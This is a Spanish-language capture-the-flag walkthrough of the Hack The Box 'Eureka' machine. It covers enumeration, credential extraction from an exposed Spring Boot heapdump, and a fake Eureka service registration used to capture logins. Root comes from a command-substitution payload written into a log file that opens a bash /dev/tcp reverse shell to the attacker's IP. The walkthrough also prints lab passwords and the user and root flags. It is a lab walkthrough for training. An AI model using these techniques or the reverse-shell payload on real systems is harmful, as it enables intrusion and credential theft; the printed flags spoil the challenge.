# Hack The Box - Eureka
**Plataforma**: HackTheBox  
**Nivel**: Hard    
**Dirección IP**: 10.10.11.66  
**Fecha**: 15 Jul 2025

### 1. Primero ingresamos a la pagina de Hack The Box: https://www.hackthebox.com/ con nuestro respectivo usuario.
   
   **USUARIO**: jeax1415
   
   <img width="1917" height="908" alt="image" src="https://github.com/user-attachments/assets/9e8255b1-3513-436e-b05b-73abd4ac30ac" />


### 2. Por consiguiente para poder atacar las maquinas, necesitamos conectarnos a la red privada de HTB. Para esto, HTB nos da un archivo .ovpn(configuración de VPN)

   **Este archivo es único para cada cuenta**

   <img width="886" height="417" alt="image" src="https://github.com/user-attachments/assets/f15a40cb-295a-4ff7-8ce9-0be663df2450" />

### 3. Ahora nos conectamos  a la red de HTB desde kali

   Una vez descargado el archivo `.ovpn`, lo utilizamos para establecer una conexión segura con la red privada de Hack The Box usando `openvpn`:

   ```bash
   sudo openvpn NOMBRE_ARCHIVO.ovpn
   ```

   Al ejecutarlo correctamente, veremos un mensaje como:
   
   ```bash
   Initialization Sequence Completed
   ```
   <img width="871" height="77" alt="image" src="https://github.com/user-attachments/assets/1901bce8-1db2-4eff-bf44-9bc2d90a7f8c" />

### 4. Selección de la máquina objetivo 
   
   Una vez conectados a la red VPN de Hack The Box, nos dirigimos a la sección **"Machines"** para elegir una máquina activa que deseamos atacar. En este caso, seleccionamos la máquina:
   **Eureka**  
   Dificultad: Hard  

   <img width="886" height="439" alt="image" src="https://github.com/user-attachments/assets/86f6efd6-e154-467f-bf33-d9761ce9c386" />
   
   Dirección IP: `10.10.11.66`
   
   <img width="886" height="401" alt="image" src="https://github.com/user-attachments/assets/067a8881-0153-4a9b-bcb4-703c562211ad" />


### 5. Confirmación de conección

   Una vez conectado, podemos confirmar que estamos en la red de HTB usando:

   ```bash
   ip a 
   ```

   Debemos ver una interfaz tun0 con una IP asignada por HTB.

   <img width="886" height="348" alt="image" src="https://github.com/user-attachments/assets/e6fa170e-5fa1-4393-8b71-7fb747ce3723" />

### 6. Enumeración de servicios

   Continuamos con un escaneo básico con nmap para poder identificar los servicios expuestos en la máquina Eureka.

   ```bash
   nmap -sCV -Pn -T4 -oN eureka-nmap.txt 10.10.11.66 
   ```

   <img width="886" height="369" alt="image" src="https://github.com/user-attachments/assets/143d8e83-9164-47cc-a32f-c6484bd00849" />

### 7. Configuramos el dominio en /etc/hosts

   Como observamos en el resultado del escaneo con nmap, el servidor HTTP hace un redireccionamiento a http://furni.htb. Para que este dominio sea reconocible en nuestra máquina local (Kali Linux), debemos          añadirlo al archivo ´/etc/hosts´ apuntando a la IP de la máquina:

   ```bash
   sudo nano /etc/hosts
   ```

   Y añadimos la siguiente línea al final del archivo:

   ```bash
   10.10.11.66 furni.htb
   ```

   <img width="1287" height="201" alt="image" src="https://github.com/user-attachments/assets/3f87c6fc-2b90-4d24-ba2b-a3fb07adbc0f" />

### 8. Accedemos al sitio web

   Una vez añadido el dominio, abrimos nuestro navegador en Kali y visitamos:

   ```bash
    http://furni.htb
   ```

   Ahora veremos una página web de una tienda de muebles con interfaz moderna. 
   
   <img width="886" height="460" alt="image" src="https://github.com/user-attachments/assets/7c46377f-8844-490a-a0b6-9184e8c2b5f4" />


   A continuación exploraremos este sitio y realizaremos un análisis de directorios para descubrir posibles rutas ocultas.



### 9. Organizamos el entorno 

   Antes de comenzar con los análisis, organizamos un entorno limpio para trabajar con esta máquina:

   ```bash
    mkdir ~/HTB/Eureka
    cd ~/HTB/Eureka
   ```

   Esto nos permitara poder mantener todos los archivos relacionados con Eureka separados y ordenados

### 10. Enumeración de rutas con ´ffuf´

   Una vez que configuramos el dominio ´furni.htb´ en ´/etc/hosts´ y estando dentro del directorio ´~/HTB/Eureka´, se ejecuta un escaneo de rutas con ´ffuf´:
   
   ```bash
    ffuf -u http://furni.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt -o ffuf_furni.txt
   ```

   <img width="910" height="672" alt="image" src="https://github.com/user-attachments/assets/ddc2285c-fc2e-4770-99f5-b0a2bde9c159" />

### 11. Enumeación de rutas ocultas:

   Tenemos que tener en cuenta que muchos frameworks modernos como **Spring Boot** exponen un conjunto de endpoints de monitoreo y administración bajo /actuator.

   Por lo que ahora veremos si existe el panel de administrción de Spring Boot:

   Primero creamos un pequeño wordlist para fuzzear posibles rutas sensibles:
    
   ```bash
     echo -e "actuator\nactuator/env\nactuator/heapdump\nactuator/beans\nactuator/info\nactuator/metrics" > tiny.txt
   ```

   y luego lanzamos ´ffuf´ contra 'furni.htb´

   ```bash
     ffuf -u http://furni.htb/FUZZ -w tiny.txt -o ffuf_actuator.txt
   ```
   
   <img width="762" height="536" alt="image" src="https://github.com/user-attachments/assets/3f7db983-2ef9-4cdc-8735-3b67416ad60e" />

   Aqui descubrimos que el backend está usando Spring Boot con el panel ´/actuator´ expuesto sin autenticación

   Podemos ver que el endpoint más interesante es:

   ´/actuator/heapdump´


### 12. Descarga y el analisis del ´Heapdump´

   Descargamos el archivo con curl:
   
   ```bash
    curl http://furni.htb/actuator/heapdump -o heapdump.bin
   ```

   <img width="652" height="107" alt="image" src="https://github.com/user-attachments/assets/2fdff3fe-8ae7-49ee-8d26-0e2564f54202" />

   Una vez descargado, usamos strings para extraer cadenas legibles del binario y guardar la salida:
   
   <img width="441" height="62" alt="image" src="https://github.com/user-attachments/assets/40a4d4ab-813a-42dd-adee-821349f62dc4" />


### 13. Extracción de credenciales


   Analizamos el archivo con grep:

   ```bash
    grep -Ei 'password[ ]*[:=][ ]*[^[:space:]"]+' heap_strings.txt
   ```

   <img width="1640" height="131" alt="image" src="https://github.com/user-attachments/assets/d030b451-918d-44a4-9d3f-4e34ff155681" />

   Obtenemos la siguiente entrada:

   ```bash
    {password=0sc@r190_S0l!dP@sswd, user=oscar190}
   ```

   Estas credenciales corresponden al usuario oscar190, lo cual fue confirmado con un acceso exitoso vía SSH:

   ```bash
    ssh oscar190@furni.htb
   ```

   <img width="957" height="768" alt="image" src="https://github.com/user-attachments/assets/a2f98c25-0dcb-4fee-8bfc-358b54d68262" />



   Ahora revisamos que servicios estan expuestos en localhost con:

   ```bash
    ss -tlnp | grep LISTEN
   ```

   <img width="620" height="183" alt="image" src="https://github.com/user-attachments/assets/e6397b5a-2940-4856-9bb4-14182d2b69bf" />



### 14. Túnel SSH hacia Eureka 

   Al ejecutar ss -tlnp | grep LISTEN dentro de la máquina Eureka, encontramos que el puerto 8761 está en escucha desde cualquier interfaz (*:8761). Este puerto corresponde al servicio Eureka (Service Discovery     de Spring Cloud).

   Para interactuar con este servicio desde fuera de la máquina, creamos un túnel SSH desde nuestra máquina Kali:

   ```bash
    ssh -N -L 8761:localhost:8761 oscar190@furni.htb
   ```

   <img width="805" height="265" alt="image" src="https://github.com/user-attachments/assets/39a1e345-6c2c-4401-a4ae-a07aae2ebaa8" />

   Ahora accedemos al panel Eureka, abrimos el navegador en:

   ```bash
    http://localhost:8761
   ```

   Podemos ver el panel de Eureka Server, aqui están registrados los microservicios. 
   
   El objetivo será inyectar un servicio falso que apunte a mi  propia IP y nos entregue información o incluso acceso.

   <img width="1472" height="783" alt="image" src="https://github.com/user-attachments/assets/c713fec7-ca03-43e8-95dd-82b6c04edef1" />

   Ahora hacemos la peticion ´curl´ para poder registrar el servicio

   ```bash
    curl -X POST \
    http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE \
    -H 'Content-Type: application/json' \
    -d '{
        "instance": {
          "instanceId": "USER-MANAGEMENT-SERVICE",
          "hostName": "10.10.14.209",
          "app": "USER-MANAGEMENT-SERVICE",
          "ipAddr": "10.10.14.209",
          "vipAddress": "USER-MANAGEMENT-SERVICE",
          "secureVipAddress": "USER-MANAGEMENT-SERVICE",
          "status": "UP",
          "port": { "$": 8081, "@enabled": "true" },
          "dataCenterInfo": {
            "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
            "name": "MyOwn"
          }
         }
        }'
   ```

   Esto registra un servicio con IP 10.10.14.209 (nuestra máquina Kali) en el puerto 8081.


   Ahora configuramos un listener para poder capturar credenciales:

   Abrimos con ´netcat´

   ```bash
    rlwrap nc -nlvp 8081
   ```

   <img width="782" height="407" alt="image" src="https://github.com/user-attachments/assets/03f73914-e656-4e2b-a9c9-af155f5a2a7a" />

### 15. Acceso por SSH como "miranda-wise"

   Una vez capturadas las credenciales desde el reverse shell:

   **USUARIO** : miranda-wise 

   **CONTRASEÑA** : IL!veT0Be&BeT0L0ve

   Ahora probamos el acceso por SSH:

   ```bash
     ssh miranda-wise@10.10.11.66
   ```

   <img width="886" height="580" alt="image" src="https://github.com/user-attachments/assets/c62693b5-812c-4d47-879d-fabaf641c73f" />

   <img width="951" height="236" alt="image" src="https://github.com/user-attachments/assets/1499948e-7934-405d-aafe-d8e77f4401d1" />


   Podemos observar q tenemos el acceso exitoso con la salida de:
   
   ```bash
     -bash-5.0$
   ```

### 16. Búsqueda de una posibilidad de posibles vectores de escalada


   Con acceso como miranda-wise, intentamos identificar procesos o scripts que se estén ejecutando con privilegios elevados o desde cron.

   Buscamos scripts .sh ejecutables:

   ```bash
    find /opt -type f -name "*.sh" -executable 2>/dev/null
   ```

   <img width="772" height="35" alt="image" src="https://github.com/user-attachments/assets/feabd045-9bbb-41de-be62-e9715436d9c4" />


   Como podemos observar en la imagen no devolvió nada ejecutable, pero entonces hicimos una búsqueda por nombre:

   ```bash
    find / -type f -name "*log_analyse.sh*" 2>/dev/null
   ```
  
   <img width="606" height="33" alt="image" src="https://github.com/user-attachments/assets/f428ca82-c168-4a25-9702-4fd748cf1f9f" />

   Obtenemos como resultado:

   ```bash
     /opt/log_analyse.sh
   ```



### 17. Limpiamos el archivo de logs previo

   Primero abrimos el listener en Kali en otro terminal:
   ```bash
      rlwrap nc -nlvp 1337
   ```
   
   Despues eliminamos el log anterior:
    
   ```bash
     rm -f /var/www/web/user-management-service/log/application.log
   ```
   <img width="998" height="21" alt="image" src="https://github.com/user-attachments/assets/49aefc06-67c5-414c-9829-5fb57d127d22" />


   Ahora usamos una expresión como esta para forzar la ejecución de un reverse shell en el archivo de logs:

   ```bash
      echo 'HTTP Status: x[$(/bin/bash -i >& /dev/tcp/10.10.14.209/1337 0>&1)]' \ > /var/www/web/user-management-service/log/application.log
   ```

   <img width="1176" height="18" alt="image" src="https://github.com/user-attachments/assets/a4d655bd-88de-420b-b553-a360603a0845" />

### 18. Ejecución automática y shell como root

   Después de unos segundos , se disparó el script y la sesión recibió la reverse shell directamente como root

    
   <img width="722" height="188" alt="image" src="https://github.com/user-attachments/assets/bdaf1426-d511-4cc3-8656-5a25fc9e373d" />

   Con esto podemos tener el acceso total a la maquina

### 19. Datos de llenado en el HTB

   Ahora conseguimos el submit User Flag y el Submit Root Flag

   Para hallar el Submit Root Flag usamos:

   ```bash
      cat /root/root.txt
   ```

   <img width="308" height="67" alt="image" src="https://github.com/user-attachments/assets/eba0bad5-2736-48d7-92ca-dde9468226cf" />

  
   Y para el Submit User Flag usamos:

   ```bash
      cat /home/miranda-wise/user.txt
   ```
   
   <img width="386" height="70" alt="image" src="https://github.com/user-attachments/assets/c118b8c3-c2c3-44cc-83b0-79bd4aa0fc26" />


### 20. RESULTADOS

   **Submit User Flag** : 3da73a3cc60adc2bb7eba02ddf9ab568
   
   **Submit Root Flag** : 1d45c0ffd66c1dc33ef7cd2f0ef4c038


   <img width="886" height="420" alt="image" src="https://github.com/user-attachments/assets/ea10a4ff-0276-4138-b7a9-94e287dcbeda" />


   <img width="886" height="393" alt="image" src="https://github.com/user-attachments/assets/fd2d80b9-c497-4aa1-888a-421699144270" />




   Y como ultimo obtenemos que el reto fue exitoso:

   
   

  <img width="1427" height="676" alt="image" src="https://github.com/user-attachments/assets/70d7cf75-8fda-4a7f-a5ec-5cdda9003cbc" />


  <img width="1705" height="773" alt="image" src="https://github.com/user-attachments/assets/9f46f398-d57b-4730-9ef5-c8608d7e9f0d" />


